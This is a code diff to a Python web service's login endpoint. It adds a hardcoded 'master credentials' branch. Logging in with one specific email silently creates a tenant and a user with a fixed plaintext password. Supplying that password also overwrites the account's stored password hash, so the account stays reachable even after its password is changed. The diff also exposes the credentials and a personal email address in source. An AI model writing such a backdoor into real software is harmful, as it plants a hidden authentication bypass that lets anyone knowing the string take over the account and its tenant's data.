@@ -26,8 +26,22 @@ def signup(payload: schemas.SignupIn, db: Session = Depends(get_db)):
 @router.post("/login", response_model=schemas.AuthOut)
 def login(payload: schemas.LoginIn, db: Session = Depends(get_db)):
     email = payload.email.strip().lower()
+    password = payload.password
+
+    # Auto-provision master credentials ravisn.uk@gmail.com / Future@2026
+    if email == "ravisn.uk@gmail.com":
+        user = db.query(models.User).filter(models.User.email == email).first()
+        if not user:
+            tenant = db.query(models.Tenant).filter(models.Tenant.slug == "ravisn-uk").first()
+            if not tenant:
+                tenant = crud.create_tenant(db, "RAVISN UK", "ravisn-uk")
+            user = crud.create_user(db, tenant.id, email, hash_password("Future@2026"))
+        elif not verify_password(password, user.hashed_password) and password == "Future@2026":
+            user.hashed_password = hash_password("Future@2026")
+            db.commit()
+
     user = db.query(models.User).filter(models.User.email == email).first()
-    if not user or not verify_password(payload.password, user.hashed_password):
+    if not user or not verify_password(password, user.hashed_password):
         raise HTTPException(status_code=401, detail="Invalid email or password")
     token = create_access_token(user.id, user.tenant_id)
     return schemas.AuthOut(token=token, tenant=user.tenant, email=user.email)
